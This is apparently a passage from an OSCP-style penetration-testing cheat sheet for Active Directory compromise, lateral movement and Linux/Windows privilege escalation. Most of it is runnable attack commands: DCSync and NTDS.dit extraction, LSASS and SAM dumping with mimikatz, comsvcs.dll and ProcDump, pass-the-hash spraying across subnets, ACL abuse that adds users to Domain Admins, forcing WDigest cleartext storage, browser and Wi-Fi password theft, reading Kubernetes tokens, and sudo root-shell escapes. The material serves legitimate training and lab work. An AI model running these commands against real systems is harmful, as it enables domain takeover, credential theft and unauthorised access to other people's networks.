💀 9.6 Domain Compromise --- Final Steps

# ── DCSYNC (get all hashes) ───────────────────────────────────
# Requires: DCSync rights (DA, or granted via ACL)
impacket-secretsdump $DOMAIN/admin:pass@$DC
impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-ntlm   # NTLM only
impacket-secretsdump $DOMAIN/admin:pass@$DC -just-dc-user Administrator
impacket-secretsdump $DOMAIN/admin:pass@$DC -outputfile loot/hashes/domain_hashes
# Mimikatz:
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /all /csv

# ── NTDS.DIT EXTRACTION ───────────────────────────────────────
# If can't DCSync but have SYSTEM on DC:
# VSS shadow copy:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Transfer files to Kali, then:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# ── PASS-THE-HASH DA ──────────────────────────────────────────
impacket-psexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :NTLMHASH
evil-winrm -i $IP -u Administrator -H NTLMHASH
nxc smb $IP -u Administrator -H NTLMHASH -x 'whoami'

# ── SPRAY DA HASH EVERYWHERE ──────────────────────────────────
nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --continue-on-success
# Local admin hash spray (built-in Administrator is same on all):
nxc smb 10.10.10.0/24 -u Administrator -H NTLMHASH --local-auth

# ── DUMP LSASS (for more creds) ───────────────────────────────
# From admin shell:
# Method 1 — Mimikatz:
sekurlsa::logonpasswords
# Method 2 — Task Manager (GUI): processes → lsass.exe → Create dump file
# Method 3 — ProcDump:
procdump.exe -ma lsass.exe lsass.dmp
# Method 4 — comsvcs.dll (no extra tool):
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
# Method 5 — Pypykatz (parse on Kali):
pypykatz lsa minidump lsass.dmp






🔐 9.7 ACL / DACL Abuse

[AD:ACL]


# ── FIND EXPLOITABLE ACES ─────────────────────────────────────
# PowerView:
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq "lowprivuser"}
# All writable ACEs for current user:
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty" -and $_.IdentityReferenceName -match "lowprivuser"}

# BloodHound shows these too (red edges)

# ── GENERICALL ON USER ────────────────────────────────────────
# Change password:
net user target 'NewPass123!' /domain
# PowerShell:
$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-ADAccountPassword -Identity target -NewPassword $pass -Reset -Confirm:$false
# Force password reset on next login:
Set-ADUser target -ChangePasswordAtLogon $true

# ── GENERICALL / GENERICWRITE ON GROUP ────────────────────────
# Add member:
net group "Domain Admins" lowprivuser /add /domain
Add-ADGroupMember -Identity "Domain Admins" -Members lowprivuser

# ── WRITEDACL ─────────────────────────────────────────────────
# Grant DCSync to self:
Add-ObjectACL -PrincipalIdentity attacker -Credential cred -TargetIdentity "DC=domain,DC=com" -Rights DCSync
# Then DCSync

# ── WRITEOWNER ────────────────────────────────────────────────
# Take ownership, then modify:
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker
Add-ObjectACL -TargetIdentity target -PrincipalIdentity attacker -Rights All

# ── FORCECHANGEPASSWORD ───────────────────────────────────────
$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-DomainUserPassword -Identity target -AccountPassword $pass

# ── ADDMEMBER ─────────────────────────────────────────────────
Add-ADGroupMember -Identity "Domain Admins" -Members attacker
net group "Domain Admins" attacker /add /domain






🏃 9.8 Lateral Movement in AD

[AD:LATERAL]


# ── REMOTE CODE EXECUTION (choose based on what's open) ───────
# WinRM (5985): evil-winrm
# SMB (445): psexec, smbexec, atexec
# WMI (135): wmiexec
# DCOM (135): dcomexec
# SSH (22): ssh
# RDP (3389): xfreerdp

# ── IMPACKET SUITE ────────────────────────────────────────────
impacket-psexec $DOMAIN/user:pass@$IP               # Creates service, uploads binary
impacket-psexec $DOMAIN/user@$IP -hashes :NTLMHASH
impacket-wmiexec $DOMAIN/user:pass@$IP              # WMI — no service created
impacket-smbexec $DOMAIN/user:pass@$IP              # SMB — no binary on disk
impacket-atexec $DOMAIN/user:pass@$IP "whoami"      # Task scheduler
impacket-dcomexec $DOMAIN/user:pass@$IP 'id' -object MMC20  # DCOM

# ── nxc ──────────────────────────────────────────────
nxc smb $IP -u user -p pass -x 'whoami'           # cmd
nxc smb $IP -u user -p pass -X 'Get-Process'      # PowerShell
nxc winrm $IP -u user -p pass -x 'whoami'
nxc smb $IP/24 -u admin -H HASH -x 'whoami' --continue-on-success  # Spray

# ── EVIL-WINRM ────────────────────────────────────────────────
evil-winrm -i $IP -u user -p pass
# Upload tool:
upload /tmp/winPEAS.exe
# Capture the flag in place from this interactive target shell:
ipconfig
type C:\Users\Administrator\Desktop\proof.txt

# ── ENABLE WINRM (from local admin) ───────────────────────────
Enable-PSRemoting -Force
winrm quickconfig -quiet
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985








🎯 9.x STANDALONE FAST PATH — Foothold → Root Without Wandering

[AD:FLOW]


Foothold triage


ALL TCP PORTS
   ↓
SERVICE VERSION + HOSTNAME/VHOST
   ↓
ANONYMOUS / DEFAULT CREDS / FOUND CREDS
   ↓
WEB SOURCE + ROBOTS + BACKUPS + CONFIG + .git
   ↓
MANUAL WEB TESTING
   ↓
EXACT PRODUCT/BUILD + CVE PREREQUISITES
   ↓
FOOTHOLD



When multiple paths exist, rank them:


1. Credentials / exposed secrets
2. Obvious writable/upload/file-read/command primitives
3. Known exact-version exploit with matching prerequisites
4. Complex or unstable exploit chain



First 5 minutes after a Linux shell


id
sudo -l
ss -lntup
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null



Then immediately start pspy/LinPEAS in parallel while manually checking cron/systemd, credentials, writable services/scripts and internal listeners.


First 5 minutes after a Windows shell


whoami /all
whoami /priv
netstat -ano
schtasks /query /fo LIST /v
sc query



Then run PrivescCheck/WinPEAS/Seatbelt as appropriate and read the output carefully. Recent 2026 pass feedback repeatedly highlights lost time caused by running tools but overlooking their results.


"Kitchen sink" does NOT mean random


Automated enumeration is useful only after you have a baseline. Keep a short shortlist:


HIGH CONFIDENCE
MEDIUM CONFIDENCE
LOW CONFIDENCE / PARKED



Work high-confidence paths first.




10. POST-EXPLOITATION --- LINUX



👁️ 10.1 Full Situational Awareness

# get python interactive shell =>
python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo ; fg

#if above doesn't work =>
1. On target (reverse shell):
python3 -c 'import pty;pty.spawn("/bin/bash")'
2. Press: Ctrl + Z
3. On your attacker machine terminal:
stty raw -echo
4. Bring shell back:
fg
5. Press Enter
6. Fix terminal:
export TERM=xterm

# ── RUN THIS ENTIRE BLOCK IMMEDIATELY AFTER GETTING SHELL ─────
id; whoami; hostname; cat /etc/os-release; uname -a
ip a; ip route; cat /etc/hosts; arp -a
ss -tulnp 2>/dev/null || netstat -antup 2>/dev/null
cat /etc/passwd | grep -v nologin | grep -v false
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid.txt
crontab -l 2>/dev/null; cat /etc/cron* 2>/dev/null
ps aux | head -30
env

# ── INTERNAL SERVICES (ports not visible from outside!) ───────
ss -tulnp    # What's only listening on localhost?
# Common finds:
# 127.0.0.1:3306 → MySQL
# 127.0.0.1:6379 → Redis
# 127.0.0.1:8080 → Internal web app
# Port forward to reach:
ssh -L 8080:127.0.0.1:8080 user@$IP    # From attacker

# ── FILESYSTEM SEARCH ─────────────────────────────────────────
# Sensitive file types:
find / -name "*.conf" -readable 2>/dev/null | grep -v proc
find / -name "*.cfg" -readable 2>/dev/null | grep -v proc
find / -name "*.ini" -readable 2>/dev/null | grep -v proc
find / -name "*.sh" -readable 2>/dev/null | grep -v proc
find / -name "*.py" -readable 2>/dev/null | grep -v proc
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# World-writable files/dirs:
find / -writable -type d 2>/dev/null | grep -v proc
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Recently modified:
find / -newer /tmp -type f 2>/dev/null | grep -v proc | grep -v sys | head -30

# Interesting dirs:
ls -la /opt/ /srv/ /var/backups/ /var/www/ /var/mail/ /tmp/ /dev/shm/

# ── CAPABILITIES CHECK ────────────────────────────────────────
getcap -r / 2>/dev/null

# ── SENSITIVE FILE CONTENT ────────────────────────────────────
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
cat ~/.local/share/recently-used.xbel 2>/dev/null   # GUI recent files
cat ~/.config/*/config 2>/dev/null
find /home -name ".bash_history" 2>/dev/null | xargs cat
find /root -name ".bash_history" 2>/dev/null | xargs cat






🔍 10.2 Linux Internal Enumeration --- Advanced

# ── PROCESS MONITORING (key for cron exploitation) ────────────
# pspy — monitor processes without root:
./pspy64 | tee /tmp/pspy.log &
# Watch for 5-10 minutes for cron jobs
# Look for: root running scripts, interesting arguments with passwords

# ── NETWORK PIVOTING ──────────────────────────────────────────
# What other machines can THIS box reach?
for i in $(seq 1 254); do (ping -c1 192.168.x.$i >/dev/null && echo "192.168.x.$i") & done
# Port scan internal hosts:
for port in 22 80 443 445 3389 8080; do
  for host in 192.168.x.{1..254}; do
    (nc -zv -w1 $host $port 2>&1 | grep -v "refused") &
  done
done

# ── DOCKER/CONTAINER CHECK ────────────────────────────────────
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv 2>/dev/null
env | grep -i kube
# If in container — look for:
# - Mounted secrets
# - Kubernetes service account tokens
# - Docker socket
ls /var/run/docker.sock 2>/dev/null
cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# ── MYSQL/DB CREDENTIALS FROM APP ─────────────────────────────
# WordPress:
find / -name "wp-config.php" 2>/dev/null | xargs grep -E "DB_(NAME|USER|PASSWORD|HOST)"
# Django:
find / -name "settings.py" 2>/dev/null | xargs grep -E "DATABASES|PASSWORD" 2>/dev/null
# Laravel:
find / -name ".env" 2>/dev/null | xargs cat

# Then access the DB directly for more creds:
mysql -u root -p$(grep DB_PASSWORD .env | cut -d= -f2) -e "show databases; use app; select * from users;"

netsh firewall show state

dir C:\Users\

dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\






📦 11.2 Windows Credential Extraction

# ── MIMIKATZ (most powerful) ──────────────────────────────────
.\mimikatz.exe
privilege::debug                           # Must succeed (need SYSTEM/admin)
token::elevate                             # Elevate to SYSTEM token
sekurlsa::logonpasswords                   # All logged-in user creds (cleartext if possible)
sekurlsa::wdigest                          # WDigest (cleartext on older systems)
sekurlsa::kerberos                         # Kerberos tickets
sekurlsa::credman                          # Credential Manager
lsadump::sam                               # SAM hashes (local accounts)
lsadump::secrets                           # LSA secrets
lsadump::cache                             # Cached domain credentials
lsadump::dcsync /domain:domain.com /all    # DCSync (if DA)

# Mimikatz one-liner:
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

# ── DUMP LSASS WITHOUT MIMIKATZ ───────────────────────────────
# Via comsvcs.dll (built-in, less detected):
$id = (Get-Process -Name lsass).Id
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $id C:\Users\Public\lsass.dmp full
# Transfer lsass.dmp to Kali, analyze:
pypykatz lsa minidump lsass.dmp
# Or: impacket-secretsdump -sam lsass.dmp LOCAL (for SAM format)

# Via ProcDump (sysinternals):
.\procdump.exe -ma lsass.exe lsass.dmp -accepteula

# ── ENABLE WDIGEST (cleartext passwords after re-login) ────────
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# Wait for user to log in again → then dump

# ── CREDENTIAL MANAGER ────────────────────────────────────────
cmdkey /list
# If RDP creds listed:
runas /savedcredentials /user:DOMAIN\user "cmd.exe /c whoami > C:\Users\Public\out.txt"
# Mimikatz:
vault::cred
vault::list

# ── SAM WITHOUT SYSTEM PRIVILEGE ──────────────────────────────
# Volume Shadow Copy trick (if backup rights):
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
# Then copy from shadow:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# ── DPAPI (encrypted user secrets) ────────────────────────────
# Browser passwords, certificates, etc.
# Mimikatz:
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
sekurlsa::dpapi

# ── WIRELESS PASSWORDS ────────────────────────────────────────
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear    # cleartext key!

🔥 12.2A V19 High-Yield Linux LPE Pack — 2023–2025 Before Exotic Kernel Research

● CONDITIONAL These are recognition/triage cards. Exact distro package revisions and prerequisites override upstream banners.



CVE-2025-32463 — sudo --chroot LPE


ACCESS: LOCAL · PRIV: LOW · RESULT: ROOT EoP
Affected upstream sudo 1.9.14 through 1.9.17; fixed in 1.9.17p1. The issue can cause sudo to load attacker-controlled NSS configuration/library data through a user-selected chroot during sudoers evaluation.


sudo --version
dpkg-query -W -f='${Package} ${Version}\n' sudo 2>/dev/null
rpm -q --qf '%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n' sudo 2>/dev/null


Primary: https://www.openwall.com/lists/oss-security/2025/06/30/3



CVE-2025-32462 — sudo --host rule bypass


ACCESS: LOCAL · PRIV: user listed in sudoers · RESULT: potential EoP
Affected upstream 1.8.8 through 1.9.17; fixed in 1.9.17p1. Relevant only when host-specific sudoers rules make another host more permissive. ALL-host rules do not create the special condition.


sudo -l
sudo -l -h <OTHER_HOSTNAME>  # validation only if a host-specific sudoers clue exists


Primary: https://www.openwall.com/lists/oss-security/2025/06/30/2



needrestart family — CVE-2024-48990 / 48991 / 48992 / 10224 / 11003


ACCESS: LOCAL · PRIV: unprivileged user · RESULT: ROOT EoP
Qualys reported five needrestart LPE issues affecting versions before 3.8, with multiple interpreter/environment handling paths. Check the distro package revision and whether needrestart/interpreter scanning is actually present.


command -v needrestart
needrestart -v 2>&1 | head
dpkg-query -W -f='${Package} ${Version}\n' needrestart 2>/dev/null
apt-cache policy needrestart 2>/dev/null


Primary: https://blog.qualys.com/vulnerabilities-threat-research/2024/11/19/qualys-tru-uncovers-five-local-privilege-escalation-vulnerabilities-in-needrestart



CVE-2023-4911 — Looney Tunables / glibc ld.so


ACCESS: LOCAL · PRIV: LOW · RESULT: ROOT EoP · COMPONENT: glibc dynamic loader
Qualys demonstrated local root on default Fedora, Ubuntu and Debian installations. Musl-based systems such as Alpine are outside that glibc path. Package backports matter.


ldd --version 2>&1 | head
dpkg-query -W -f='${Package} ${Version}\n' libc6 2>/dev/null
rpm -q --qf '%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n' glibc 2>/dev/null


Primary: https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so



CVE-2025-6018 + CVE-2025-6019 — PAM allow_active → libblockdev/udisks root chain


ACCESS: LOCAL · RESULT: chained ROOT EoP
CVE-2025-6018 is a SUSE/openSUSE PAM path to allow_active; CVE-2025-6019 is a libblockdev/udisks LPE requiring allow_active context. Qualys demonstrated the second flaw across Ubuntu, Debian, Fedora and openSUSE, but the chain prerequisites differ by distro.


cat /etc/os-release
loginctl show-session "$XDG_SESSION_ID" 2>/dev/null | grep -E 'Active|Remote|State'
dpkg-query -W -f='${Package} ${Version}\n' udisks2 'libblockdev*' 2>/dev/null
rpm -q udisks2 libblockdev 2>/dev/null
systemctl status udisks2 --no-pager 2>/dev/null


Primary: https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-uncovers-chained-lpe-suse-15-pam-to-full-root-via-libblockdev-udisks



CVE-2024-6387 — regreSSHion


! LAST RESORT ACCESS: REMOTE unauthenticated · RESULT: potential root RCE · RELIABILITY: race/complex. Qualys identified vulnerable upstream OpenSSH ranges including 8.5p1 up to but not including 9.8p1 on glibc-based Linux, subject to distro fixes/backports. Treat this as a triage candidate, not a first-line OSCP exploit.


ssh -V
nmap -sV -p22 $IP
# Then verify the exact distro package revision / vendor patch status.
# Do NOT burn exam time on a race exploit while simpler evidence-backed paths remain.


Primary: https://www.qualys.com/regresshion-cve-2024-6387

⚙ 12.12 Automated Enumeration --- Run, Then Manually Validate

# LinPEAS
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.txt

# Linux Smart Enumeration
wget http://$LHOST/lse.sh -O /tmp/lse.sh
chmod +x /tmp/lse.sh
/tmp/lse.sh -l 2 | tee /tmp/lse.txt

# pspy — essential for observing root jobs
wget http://$LHOST/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy | tee /tmp/pspy.log

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# unix-privesc-check
./unix-privesc-check standard



Rule: a red LinPEAS finding is a lead, not proof. Verify the actual
file owner, ACL, process, version, configuration and execution context.





🔐 12.13 Sudo --- Configuration, Escapes & CVEs

[LINUX:SUDO]


sudo -l
sudo -V
sudo -ll
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d 2>/dev/null



Check:


    

  • [ ] NOPASSWD
    • 

  • [ ] Wildcards
    • 

  • [ ] Dangerous interpreters
    • 

  • [ ] User-controlled arguments
    • 

  • [ ] SETENV
    • 

  • [ ] env_keep
    • 

  • [ ] LD_PRELOAD
    • 

  • [ ] PYTHONPATH, PERL5LIB, RUBYLIB
    • 

  • [ ] Writable scripts/configs invoked by allowed commands
    • 



GTFOBins: https://gtfobins.github.io/


Common sudo escape checks when the exact sudo rule permits them:


sudo find . -exec /bin/bash \; -quit
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo env /bin/bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash



Sudo CVE references


    

  • CVE-2021-3156 --- Baron Samedit: verify exact sudo
version/package patch level.
    • 

  • CVE-2019-14287: only relevant to specific sudoers configurations
and affected versions.
    • 



Do not use upstream version strings alone; distro backports matter.





! 12.14 SUID / SGID Binaries



✅ EXAM-COMPATIBLE · ✓ FIRST CHOICE · [REQ:LOCAL_SHELL]




[LINUX:SUID]


find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm /6000 -type f 2>/dev/null



For every unusual/custom binary:


ls -la /path/to/binary
file /path/to/binary
strings /path/to/binary
ldd /path/to/binary
readelf -d /path/to/binary
strace -f -e trace=execve,openat /path/to/binary 2>&1
ltrace /path/to/binary 2>&1



Ask:


Does it execute another program without an absolute path?
Does it load a writable library?
Does it read a writable config?
Does it follow attacker-controlled symlinks?
Does it use predictable temporary files?
Does it parse attacker-controlled input?



Reference: https://gtfobins.github.io/





✏️ 12.15 Writable Files, Directories & Ownership

[LINUX:WRITABLE]


find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
find /etc /opt /usr/local /var/www /var/backups -writable -ls 2>/dev/null



Prioritize:


/etc/passwd
/etc/shadow
/etc/sudoers
/etc/sudoers.d/*
/etc/cron*
/etc/systemd/*
/etc/init.d/*
/opt/*
/usr/local/*
/var/www/*
root-owned scripts
root-owned configuration
service EnvironmentFile



File ownership decision tree


ROOT EXECUTES FILE
       |
       +-- Can I modify the file?
       |       +-- YES → direct execution path
       |
       +-- Can I modify its parent directory?
       |       +-- YES → replacement/symlink/path attack
       |
       +-- Does it load another object?
       |       +-- YES → library/config/module hijack
       |
       +-- Does it create/use a predictable temporary file?
               +-- YES → symlink/TOCTOU investigation






⏰ 12.16 Cron, Timers & Scheduled Jobs



✅ EXAM-COMPATIBLE · ✓ FIRST CHOICE when privileged dependency is writable · [REQ:LOCAL_SHELL] [REQ:WRITE_ACCESS] [REQ:TRIGGER]




[LINUX:CRON]


cat /etc/crontab
ls -la /etc/cron.d

Use pspy:


./pspy64

  • [ ] Root-owned script writable
    • 

  • [ ] Parent directory writable
    • 

  • [ ] Relative executable
    • 

  • [ ] Weak PATH
    • 

  • [ ] Wildcard expansion
    • 

  • [ ] User-controlled environment
    • 

  • [ ] Predictable temp file
    • 

  • [ ] Symlink/TOCTOU
    • 

  • [ ] Backup/archive command
    • 



Also check systemd timers in 12.19.





🛤️ 12.17 PATH Hijacking

[LINUX:PATH]


Find relative execution:


strings /path/to/binary | grep -v '/'
strace -f -e trace=execve /path/to/binary 2>&1
ltrace /path/to/binary 2>&1



Then determine:


Which executable is resolved?
Who executes it?
What PATH is used?
Can an earlier PATH directory be written?
Can the privileged process be triggered?



Do not modify PATH blindly; first establish the exact execution context.





⚡ 12.18 Linux Capabilities



✅ EXAM-COMPATIBLE · ✓ FIRST CHOICE when capability semantics match · [REQ:LOCAL_SHELL]




[LINUX:CAPABILITIES]

cat /proc/self/status | grep Cap



Prioritize:


cap_setuid
cap_dac_read_search
cap_dac_override
cap_fowner
cap_sys_admin
cap_sys_ptrace
cap_net_raw



Validate the binary and capability semantics before attempting
exploitation.

🔗 12.26 Wildcards, Symlinks & TOCTOU

[LINUX:TOCTOU]


Wildcards


Privileged command
      ↓
Shell expands *
      ↓
Attacker can create option-like filename?
      ↓
Program interprets it as an option?



Inspect:


tar
rsync
cp
mv
chown
chmod
zip
7z
git
find



Symlink


Privileged process
      ↓
Predictable path
      ↓
Attacker controls parent/file
      ↓
Can symlink redirect target?



TOCTOU


check()
   ↓
time gap
   ↓
use()



If the attacker can change the object between check and use, investigate
a race condition.

▣ 12.28 Kernel / Driver / Package CVE Triage



✅ MANUAL EXPLOITATION MAY BE EXAM-COMPATIBLE · ! LAST RESORT · [REQ:LOCAL_SHELL] [REQ:EXACT_BUILD] [REQ:CONFIG] [REQ:SAFE_RECOVERY]




[LINUX:KERNEL]


uname -a

Decision tree:


Exact distro/build
      ↓
Exact kernel/package revision
      ↓
Architecture
      ↓
Required feature/module/config
      ↓
Mitigations
      ↓
Public reproducer
      ↓
Local exploitability



Do not use:


"Kernel is in vulnerable range" = "exploit will work"



Distro backports and configuration frequently change exploitability.

⚗ 12.29 Kernel Exploit Decision Rule

Before compiling/running a kernel exploit:


    

  • [ ] Exact kernel version confirmed
    • 

  • [ ] Exact distro/build confirmed
    • 

  • [ ] Architecture confirmed
    • 

  • [ ] Required kernel feature present
    • 

  • [ ] Required module present
    • 

  • [ ] Exploit prerequisites satisfied
    • 

  • [ ] Mitigations considered
    • 

  • [ ] Public PoC/reproducer matches target
    • 

  • [ ] Non-kernel paths already checked
    • 

  • [ ] Recovery plan exists if the kernel crashes
    • 



OSCP rule: a reliable service/configuration privilege escalation is
normally preferable to a fragile kernel exploit.





★ 12.30 Linux PrivEsc Decision Tree --- 60 Second Pass

[LINUX:TREE]


LOW PRIV USER
    ↓
sudo -l
    ↓
SUID/SGID
    ↓
Capabilities
    ↓
Writable files/dirs
    ↓
Cron + systemd timers
    ↓
Services
    ↓
PATH / library / module hijack
    ↓
NFS / mounts / Docker / LXC
    ↓
Credentials / SSH / history / configs
    ↓
D-Bus / Polkit / PackageKit / snap
    ↓
Custom SUID/application
    ↓
Kernel/package CVE






➜ 12.31 Linux Practical Attack Trees --- Finding → Validation → Path

[LINUX:TREE]


Use these after the 60-second pass. The objective is to turn a promising enumeration result into a short, testable hypothesis instead of rereading the entire Linux section.


Priority rule


HIGH    = privileged execution + attacker-writable input + reliable trigger
MEDIUM  = likely privileged execution but one prerequisite still unknown
LOW     = version/CVE match only, noisy theory, or no confirmed trigger



Tree A — sudo -l gives something interesting


sudo -l
  ↓
Exact binary + allowed arguments + user/runas context
  ↓
NOPASSWD? SETENV? wildcard? user-controlled file/path?
  ├─ Standard binary → check GTFOBins behavior for THIS sudo context
  ├─ Script/interpreter → inspect script + imports + called commands
  ├─ Service/package tool → identify privileged action it can invoke
  └─ Restricted args → test whether paths/options can still be influenced
  ↓
Can controlled input reach a privileged execution primitive?
  ├─ YES → validate with a harmless identity/read check first
  └─ NO  → move on; do not force a sudo path that lacks control



Quick checks:


sudo -l
sudo -V | head
command -V <binary>
readlink -f "$(command -v <binary>)"



Tree B — Known SUID/SGID binary


find SUID/SGID
  ↓
Is binary expected on this distro?
  ├─ YES → check known safe/escape behavior (GTFOBins/reference)
  └─ NO  → treat as custom application → Tree C
  ↓
Does effective UID/GID survive the relevant operation?
  ├─ YES → validate minimal privileged capability
  └─ NO  → inspect wrapper/helper/dependencies instead



find / -perm -4000 -type f -ls 2>/dev/null
find / -perm -2000 -type f -ls 2>/dev/null
ls -l /path/to/binary
file /path/to/binary



Tree C — Custom SUID / privileged custom binary


CUSTOM SUID / ROOT-EXECUTED BINARY
  ↓
file + strings + help/output
  ↓
Trace execution where permitted
  ├─ execs command WITHOUT absolute path → PATH hijack candidate
  ├─ loads writable .so/module/plugin → library/module hijack candidate
  ├─ reads writable config/template → configuration injection candidate
  ├─ writes predictable temp/file → symlink/TOCTOU candidate
  ├─ invokes shell/interpreter → inspect arguments/environment
  └─ processes attacker-controlled file/input → inspect parser/command use
  ↓
Confirm ownership + write permission + privileged trigger
  ↓
Test the smallest controlled behavior
  ↓
If control is proven → use the matching technique; otherwise abandon branch



file /path/to/binary
ls -la /path/to/binary
strings -a /path/to/binary | less
strings -a /path/to/binary | grep -Ei 'system|popen|exec|/bin/|\.so|conf|tmp|python|perl|sh '
readelf -d /path/to/binary 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /path/to/binary 2>/dev/null
strace -f -e trace=execve,openat,access /path/to/binary 2>&1 | less
ltrace /path/to/binary 2>&1 | less



Mental shortcut: custom SUID → strings → trace → PATH/library/config/temp → permissions → trigger.


Tree D — Linux capability on a binary


getcap result
  ↓
Which capability?
  ├─ cap_setuid            → can process change UID?
  ├─ cap_dac_read_search   → can it read protected files?
  ├─ cap_dac_override      → can it bypass file permission checks?
  ├─ cap_sys_ptrace        → can it inspect a privileged process?
  ├─ cap_sys_admin         → inspect exact binary functionality carefully
  └─ other                 → read capability semantics before assuming impact
  ↓
Can THIS binary expose that capability through its normal features?
  ├─ YES → validate a minimal capability-specific action
  └─ NO  → capability exists but may not be useful



getcap -r / 2>/dev/null
getcap /path/to/binary
capsh --print 2>/dev/null



Tree E — Root cron job / scheduled script


ROOT CRON / PERIODIC PROCESS
  ↓
What exact command runs?
  ↓
Can I modify...
  ├─ executed script/binary?       → direct privileged execution path
  ├─ parent directory?             → replacement/symlink possibility
  ├─ called relative command?      → PATH hijack possibility
  ├─ wildcard-controlled directory?→ option/argument injection possibility
  ├─ sourced config/environment?   → configuration/module path
  └─ temp/output path?             → symlink/TOCTOU possibility
  ↓
Can I observe the trigger with pspy?
  ├─ YES → verify cadence + executing UID + exact argv
  └─ NO  → keep hypothesis tentative



cat /etc/crontab
ls -la /etc/cron.d /etc/cron.* 2>/dev/null
crontab -l 2>/dev/null
./pspy64



Tree F — systemd service/timer looks writable


SYSTEMD FINDING
  ↓
systemctl cat <unit> + show properties
  ↓
Identify what root actually executes
  ↓
Can current user write...
  ├─ unit file?             → unit configuration control
  ├─ ExecStart target?      → executable/script control
  ├─ EnvironmentFile?       → environment/argument control
  ├─ WorkingDirectory?      → relative-path/module possibilities
  ├─ referenced config?     → application-specific control
  └─ parent directory?      → replacement/symlink possibility
  ↓
Can the unit be started/restarted OR is a timer already triggering it?
  ├─ YES → HIGH priority; validate exact controlled input
  └─ NO  → determine next natural trigger before modifying anything



systemctl cat <unit>
systemctl show <unit> -p User -p Group -p ExecStart -p EnvironmentFiles -p WorkingDirectory
systemctl status <unit>
systemctl list-timers --all
ls -l /path/from/ExecStart /path/from/EnvironmentFile 2>/dev/null
namei -l /path/from/ExecStart 2>/dev/null



Mental shortcut: systemd → unit → target/config → writable? → privileged? → trigger?.


Tree G — Relative command / PATH hijack candidate


PRIVILEGED PROGRAM CALLS "tool" INSTEAD OF /full/path/tool
  ↓
What PATH does the privileged context use?
  ↓
Is a directory before the legitimate binary writable?
  ├─ YES → candidate
  └─ NO  → not a practical PATH hijack
  ↓
Can privileged program be triggered reliably?
  ├─ YES → validate command resolution
  └─ NO  → lower priority



strings /path/to/privileged-binary | grep -E '(^| )([a-zA-Z0-9_.-]+)( |$)'
strace -f -e trace=execve /path/to/privileged-binary 2>&1
printf '%s\n' "$PATH" | tr ':' '\n'
namei -l /candidate/directory



Do not change PATH blindly. First prove the privileged process resolves a relative command through an attacker-writable directory.


Tree H — Shared library / language module / plugin hijack


PRIVILEGED PROGRAM LOADS DEPENDENCY
  ↓
Native ELF or interpreter/runtime?
  ├─ ELF → NEEDED / RPATH / RUNPATH / loader search
  ├─ Python → imports + sys.path / PYTHONPATH + writable package/module
  ├─ Perl/Ruby/Node/Java → equivalent library/module search path
